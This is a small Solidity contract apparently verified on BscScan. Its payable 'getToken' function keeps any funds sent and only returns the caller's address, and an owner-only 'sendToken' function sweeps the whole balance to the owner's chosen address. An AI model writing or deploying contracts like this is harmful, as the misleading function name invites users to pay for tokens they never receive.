/**
 *Submitted for verification at BscScan.com on 2023-02-17
*/

pragma solidity ^0.8.0;


contract GetContract{

    address owner;

    constructor(){
        owner = msg.sender;
    }

    function getToken(uint amount) public payable returns(address){
        return msg.sender;
    }

    modifier onlyOwner(){
        require(msg.sender == owner, "you are not a owner");
        _;
    }

    function sendToken(address payable _to) public onlyOwner{
        _to.transfer(address(this).balance);
    }
}